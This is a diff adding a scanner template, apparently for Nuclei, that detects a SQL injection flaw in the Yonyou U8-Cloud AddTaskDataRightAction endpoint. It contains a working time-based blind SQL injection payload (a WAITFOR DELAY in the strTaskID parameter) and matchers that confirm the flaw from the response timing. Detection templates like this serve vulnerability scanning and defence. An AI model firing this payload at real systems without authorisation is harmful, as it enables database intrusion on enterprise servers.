@@ -1,0 +1,32 @@
+id: poc-yaml-yongyou-u8cloud-addtaskdatarightaction-sqli
+info:
+  name: 用友U8-Cloud AddTaskDataRightAction SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    用友U8-Cloud AddTaskDataRightAction endpoint is vulnerable to SQL Injection, allowing attackers to manipulate SQL queries.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.task.AddTaskDataRightAction&method=execute&strTaskID=1%27);WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "错误提示 - iUFO"
+          - "【操作失败】"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
